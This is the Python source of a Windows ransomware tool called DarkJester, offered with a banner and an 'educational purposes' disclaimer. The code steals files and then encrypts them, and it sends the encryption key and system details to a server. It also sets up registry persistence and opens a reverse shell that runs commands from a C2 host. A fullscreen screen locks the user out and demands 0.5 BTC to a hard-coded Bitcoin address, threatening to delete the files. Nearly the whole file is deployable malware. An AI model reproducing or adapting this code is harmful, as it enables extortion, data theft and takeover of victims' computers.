"""
________                __        ____.                __                
\______ \ _____ _______|  | __   |    | ____   _______/  |_  ___________ 
 |    |  \\__  \\_  __ \  |/ /   |    |/ __ \ /  ___/\   __\/ __ \_  __ \
 |    `   \/ __ \|  | \/    </\__|    \  ___/ \___ \  |  | \  ___/|  | \/
/_______  (____  /__|  |__|_ \________|\___  >____  > |__|  \___  >__|   
        \/     \/           \/             \/     \/            \/       
Disclaimer: DarkJester is a powerful ransomware tool developed for educational and research purposes only. 
Unauthorized use of this software is strictly illegal and may result in criminal prosecution. 
Running or deploying DarkJester on any system without explicit permission from the system owner constitutes a violation of cybersecurity laws. 
This tool is intended solely for demonstrating security flaws and testing defenses in controlled environments. 
Always act responsibly and ethically when working with this kind tool.
"""
import os
import sys
import tkinter as tk
from tkinter import messagebox
import ctypes
import ctypes.wintypes
from datetime import datetime, timedelta
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import winreg
import base64
import requests
import socket
import threading
import subprocess as sp
from concurrent.futures import ThreadPoolExecutor
import re
import time
import platform

class DarkJester:
    def __init__(self, key_size=32, iv_size=16):
        self.key = get_random_bytes(key_size)
        self.iv = get_random_bytes(iv_size)

    def exfiltrate_file(self, filepath, server_url):
        try:
            with open(filepath, 'rb') as file:
                file_data = file.read()
                filename = os.path.basename(filepath)
                files = {'file': (filename, file_data)}
                response = requests.post(server_url, files=files)
                if response.status_code == 200:
                    print(f"[+] File {filename} exfiltrated successfully.")
                else:
                    print(f"[-] Failed to exfiltrate {filename}. Status code: {response.status_code}")
        except Exception as e:
            print(f"[-] Error exfiltrating {filepath}: {e}")

    def encrypt_file(self, filepath, server_url):
        try:
            if os.path.basename(filepath) in ["darkjester_ransomware.py", "darkjester_ransomware.exe", "PLEASE_READ_ME.txt"]:
                return
            if filepath.endswith('.a1sberg'):
                return
            self.exfiltrate_file(filepath, server_url)
            cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
            with open(filepath, 'rb') as src:
                padded_data = pad(src.read(), AES.block_size)
            with open(filepath, 'wb') as dst:
                dst.write(self.iv + cipher.encrypt(padded_data))
            new_filepath = f"{filepath}.a1sberg"
            os.rename(filepath, new_filepath)
            print(f"Encrypted: {filepath}")
        except (PermissionError, OSError) as e:
            print(f"Error encrypting {filepath}: {e}")

    def encrypt_directory(self, directory, server_url, max_threads=10):
        with ThreadPoolExecutor(max_threads) as executor:
            for root, _, files in os.walk(directory):
                for file in files:
                    filepath = os.path.join(root, file)
                    executor.submit(self.encrypt_file, filepath, server_url)

    def get_mac_address(self):
        result = sp.run(['ipconfig', '/all'], capture_output=True, text=True)
        mac_pattern = re.compile(r'Physical\s+Address[^\w]*(\w{2}[-:]\w{2}[-:]\w{2}[-:]\w{2}[-:]\w{2}[-:]\w{2})', re.MULTILINE)
        mac_addresses = mac_pattern.findall(result.stdout)
        return mac_addresses[-1].strip() if mac_addresses else "N/A"

    def get_public_ip(self):
        try:
            return requests.get('https://api.ipify.org').text.strip()
        except requests.RequestException:
            return "N/A"

    def get_system_info(self):
        try:
            os_name = platform.system()
            hostname = socket.gethostname()
            user = os.getlogin()
            processor = platform.processor()
            architecture = platform.architecture()[0]
            mac_address = self.get_mac_address()
            external_ip = self.get_public_ip()
            return {
                "Operating System": os_name,
                "Hostname": hostname,
                "User": user,
                "Processor": processor,
                "Architecture": architecture,
                "MAC Address": mac_address,
                "External IP": external_ip
            }
        except Exception:
            return {}

    def exfiltrate_key(self, server_url):
        encoded_key = base64.b64encode(self.key).decode()
        system_info = self.get_system_info()
        payload = {
            "key": encoded_key,
            "system_info": system_info
        }
        try:
            requests.post(server_url, json=payload, headers={'Content-Type': 'application/json'})
        except requests.RequestException as e:
            print(f"Error exfiltrating key: {e}")

class C2_Server:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.reconnect_interval = 5
        self.current_dir = os.getcwd()
        self.command_delimiter = "<START>"
        self.response_delimiter = "<END>"

    def add_to_registry(self):
        exe_path = sys.executable
        try:
            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            key_name = "peekaboo"
            winreg.SetValueEx(registry_key, key_name, 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(registry_key)
        except Exception as e:
            print(f"Error adding to registry: {e}")

    def connect_to_server(self):
        while True:
            try:
                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                client.connect((self.host, self.port))
                return client
            except Exception as e:
                print(f"[*] Connection failed: {e}")
                time.sleep(self.reconnect_interval)

    def execute_command(self, command):
        try:
            command = command.strip()
            if command.lower() == 'cd':
                return self.current_dir
            elif command.lower().startswith('cd '):
                new_dir = command[3:].strip()
                try:
                    target_dir = os.path.abspath(os.path.join(self.current_dir, new_dir))
                    if os.path.isdir(target_dir):
                        os.chdir(target_dir)
                        self.current_dir = target_dir
                        return f"[*] Changed directory to {self.current_dir}"
                    else:
                        return f"[*] Error: Directory '{new_dir}' does not exist"
                except Exception as e:
                    return f"[*] Error changing directory: {e}"
            else:
                result = sp.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=10,
                    cwd=self.current_dir
                )
                output = result.stdout + result.stderr
                return output if output else "[*] Command executed"
        except Exception as e:
            return f"[*] Error executing command: {e}"

    def start(self):
        self.add_to_registry()
        while True:
            client = self.connect_to_server()
            try:
                while True:
                    command = ""
                    while True:
                        data = client.recv(1024).decode('utf-8', errors='ignore')
                        if not data:
                            raise Exception("Client disconnected")
                        command += data
                        if self.command_delimiter in command:
                            command = command.split(self.command_delimiter)[1].strip()
                            break
                    if command.lower() == 'exit':
                        break
                    result = self.execute_command(command)
                    response = f"{result}\n{self.response_delimiter}"
                    client.send(response.encode('utf-8'))
            except Exception as e:
                print(f"[*] Connection lost: {e}")
            finally:
                client.close()
                time.sleep(self.reconnect_interval)

class KioskApp:
    def __init__(self, root, encryption_key, directory_path):
        self.root = root
        self.encryption_key = encryption_key
        self.directory_path = directory_path
        self.deadline = datetime.now() + timedelta(hours=48)

        self.user32 = ctypes.WinDLL("user32")
        self.shell32 = ctypes.WinDLL("shell32")
        self.kernel32 = ctypes.WinDLL("kernel32")

        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.overrideredirect(True)
        self.root.geometry("{0}x{1}+0+0".format(
            self.root.winfo_screenwidth(), self.root.winfo_screenheight()
        ))

        self.set_windows_properties()
        self.disable_taskbar()
        self.show_tray_notification()

        self.root.configure(bg="#0A0A0A")
        self.root.protocol("WM_DELETE_WINDOW", self.ignore)
        self.root.bind("<Escape>", self.ignore)
        self.root.bind("<Alt-F4>", self.ignore)
        self.root.bind("<Alt-Tab>", self.ignore)
        self.root.bind("<Control-Escape>", self.ignore)
        self.root.bind("<Key>", self.ignore)

        self.canvas = tk.Canvas(self.root, bg="#0A0A0A", highlightthickness=0)
        self.canvas.pack(fill="both", expand=True)

        self.canvas.create_rectangle(
            50, 100, self.root.winfo_screenwidth() - 50, self.root.winfo_screenheight() - 50,
            fill="#1C2526", outline="#FF0000", width=2
        )

        self.canvas.create_text(
            self.root.winfo_screenwidth() // 2, 50,
            text="!!! YOUR SYSTEM HAS BEEN COMPROMISED BY A1SBERG !!!",
            font=("Courier New", 28, "bold"),
            fill="#FF0000",
            justify="center"
        )

        ransom_note = (
            "All your documents, photos, databases, and other important files have been locked\n"
            "with military-grade encryption. You have until the timer expires to pay the ransom\n"
            "or your files will be permanently deleted. Follow the instructions below to pay\n"
            "0.5 BTC to the provided Bitcoin address.\n\n"
            "DO NOT attempt to close this window, restart your computer, or contact authorities.\n"
            "Any such actions will result in immediate data destruction."
        )
        self.canvas.create_text(
            self.root.winfo_screenwidth() // 2, 200,
            text=ransom_note,
            font=("Arial", 16),
            fill="#FFFFFF",
            justify="center",
            width=900
        )

        self.timer_label = self.canvas.create_text(
            self.root.winfo_screenwidth() // 2, 350,
            text="",
            font=("Courier New", 22, "bold"),
            fill="#FF0000"
        )
        self.update_timer()

        btc_address = "1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX"
        btc_instructions = (
            f"Send 0.5 BTC to the following address:\n{btc_address}\n\n"
            "After payment, enter the base64-encoded decryption key below to unlock your files."
        )
        self.canvas.create_text(
            self.root.winfo_screenwidth() // 2, 450,
            text=btc_instructions,
            font=("Arial", 14),
            fill="#FFFFFF",
            justify="center",
            width=600
        )

        self.key_entry = tk.Entry(
            self.root,
            font=("Arial", 14),
            fg="white",
            bg="#2D3A3D",
            insertbackground="white",
            relief="flat",
            width=40
        )
        self.canvas.create_window(self.root.winfo_screenwidth() // 2, 550, window=self.key_entry)

        self.submit_button = tk.Button(
            self.root,
            text="Submit Decryption Key",
            font=("Arial", 14, "bold"),
            fg="white",
            bg="#8B0000",
            activebackground="#6B0000",
            activeforeground="white",
            relief="flat",
            command=self.check_key
        )
        self.canvas.create_window(self.root.winfo_screenwidth() // 2, 600, window=self.submit_button)

        self.feedback_label = tk.Label(
            self.root,
            text="",
            font=("Arial", 14),
            fg="#FF0000",
            bg="#1C2526"
        )
        self.canvas.create_window(self.root.winfo_screenwidth() // 2, 650, window=self.feedback_label)

        self.warning_icon = self.canvas.create_text(
            self.root.winfo_screenwidth() // 2, 700,
            text="⚠️ WARNING ⚠️",
            font=("Arial", 18, "bold"),
            fill="#FFFF00"
        )
        self.animate_warning()

    def set_windows_properties(self):
        hwnd = self.user32.GetForegroundWindow()
        WS_EX_APPWINDOW = 0x00040000
        WS_EX_NOACTIVATE = 0x00000080
        self.user32.SetWindowLongW(hwnd, -20, WS_EX_APPWINDOW | WS_EX_NOACTIVATE)
        self.kernel32.SetConsoleTitleW("CRITICAL SYSTEM ALERT")

    def disable_taskbar(self):
        taskbar_hwnd = self.user32.FindWindowW("Shell_TrayWnd", None)
        if taskbar_hwnd:
            self.user32.ShowWindow(taskbar_hwnd, 0)

    def show_tray_notification(self):
        class NOTIFYICONDATA(ctypes.Structure):
            _fields_ = [
                ("cbSize", ctypes.wintypes.DWORD),
                ("hWnd", ctypes.wintypes.HWND),
                ("uID", ctypes.wintypes.UINT),
                ("uFlags", ctypes.wintypes.UINT),
                ("uCallbackMessage", ctypes.wintypes.UINT),
                ("hIcon", ctypes.wintypes.HICON),
                ("szTip", ctypes.wintypes.WCHAR * 128),
                ("dwState", ctypes.wintypes.DWORD),
                ("dwStateMask", ctypes.wintypes.DWORD),
                ("szInfo", ctypes.wintypes.WCHAR * 256),
                ("uTimeoutOrVersion", ctypes.wintypes.UINT),
                ("szInfoTitle", ctypes.wintypes.WCHAR * 64),
                ("dwInfoFlags", ctypes.wintypes.DWORD),
            ]

        nid = NOTIFYICONDATA()
        nid.cbSize = ctypes.sizeof(NOTIFYICONDATA)
        nid.hWnd = self.user32.GetForegroundWindow()
        nid.uID = 1
        nid.uFlags = 0x00000010
        nid.dwInfoFlags = 0x00000001
        nid.szInfoTitle = "CRITICAL ALERT"
        nid.szInfo = "Your system is locked. Pay the ransom to regain access."
        self.shell32.Shell_NotifyIconW(0x00000000, ctypes.byref(nid))

    def ignore(self, event=None):
        return "break"

    def update_timer(self):
        time_left = self.deadline - datetime.now()
        if time_left.total_seconds() <= 0:
            self.canvas.itemconfig(self.timer_label, text="TIME EXPIRED! FILES DELETED!", fill="#FF0000")
            self.root.after(0, lambda: messagebox.showerror("Time's Up", "The deadline has passed. Your files are permanently lost!"))
            taskbar_hwnd = self.user32.FindWindowW("Shell_TrayWnd", None)
            if taskbar_hwnd:
                self.user32.ShowWindow(taskbar_hwnd, 5)
            self.root.after(2000, self.root.destroy)
            return
        hours, remainder = divmod(int(time_left.total_seconds()), 3600)
        minutes, seconds = divmod(remainder, 60)
        timer_text = f"Time Left: {hours:02d}:{minutes:02d}:{seconds:02d}"
        self.canvas.itemconfig(self.timer_label, text=timer_text)
        self.root.after(1000, self.update_timer)

    def animate_warning(self):
        current_color = self.canvas.itemcget(self.warning_icon, "fill")
        new_color = "#FFFF00" if current_color == "#FF0000" else "#FF0000"
        self.canvas.itemconfig(self.warning_icon, fill=new_color)
        self.root.after(500, self.animate_warning)

    def decrypt_file(self, encrypted_file_path, key):
        try:
            with open(encrypted_file_path, 'rb') as enc_file:
                encrypted_data = enc_file.read()
            iv = encrypted_data[:16]
            cipher_text = encrypted_data[16:]
            cipher = AES.new(key, AES.MODE_CBC, iv)
            decrypted_data = unpad(cipher.decrypt(cipher_text), AES.block_size)
            decrypted_file_path = encrypted_file_path.rsplit('.a1sberg', 1)[0]
            with open(decrypted_file_path, 'wb') as dec_file:
                dec_file.write(decrypted_data)
            os.remove(encrypted_file_path)
            return True
        except Exception as e:
            print(f"[-] Error decrypting {encrypted_file_path}: {e}")
            return False

    def decrypt_directory(self, key):
        success = True
        for root, _, files in os.walk(self.directory_path):
            for file_name in files:
                if file_name.endswith('.a1sberg'):
                    file_path = os.path.join(root, file_name)
                    if not self.decrypt_file(file_path, key):
                        success = False
        return success

    def check_key(self):
        entered_key = self.key_entry.get()
        try:
            decoded_key = base64.b64decode(entered_key)
            if decoded_key == self.encryption_key:
                self.feedback_label.config(text="Decrypting files...", fg="#FFFF00")
                self.root.update()
                if self.decrypt_directory(decoded_key):
                    self.feedback_label.config(text="Files decrypted successfully!", fg="#00FF00")
                    taskbar_hwnd = self.user32.FindWindowW("Shell_TrayWnd", None)
                    if taskbar_hwnd:
                        self.user32.ShowWindow(taskbar_hwnd, 5)
                    self.root.after(2000, self.root.destroy)
                else:
                    self.feedback_label.config(text="Decryption failed. Some files may be corrupted.", fg="#FF0000")
            else:
                self.feedback_label.config(text="Invalid decryption key. Try again!", fg="#FF0000")
                self.key_entry.delete(0, tk.END)
        except Exception:
            self.feedback_label.config(text="Invalid key format. Use base64-encoded key.", fg="#FF0000")
            self.key_entry.delete(0, tk.END)

def run_gui(encryption_key, directory_path):
    root = tk.Tk()
    app = KioskApp(root, encryption_key, directory_path)
    root.mainloop()

if __name__ == "__main__":
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.user32.MessageBoxW(
            0,
            "Please run this program as Administrator.",
            "Cannot Proceed",
            0x10
        )
        sys.exit(1)

    directory_path = "path_to_directory_to_encrypt" # Modify this
    server_url = "http://127.0.0.1:5000/upload" # Modify this
    key_server_url = "http://127.0.0.1:5000/store-key" # Modify this
    c2_host = "127.0.0.1" # Modify this
    c2_port = 1234 # Modify this

    jester = DarkJester()
    jester.encrypt_directory(directory_path, server_url, max_threads=30)
    jester.exfiltrate_key(key_server_url)
    time.sleep(50)

    gui_thread = threading.Thread(target=run_gui, args=(jester.key, directory_path))
    shell = C2_Server(c2_host, c2_port)
    shell_thread = threading.Thread(target=shell.start)

    gui_thread.start()
    shell_thread.start()

    gui_thread.join()
    shell_thread.join()
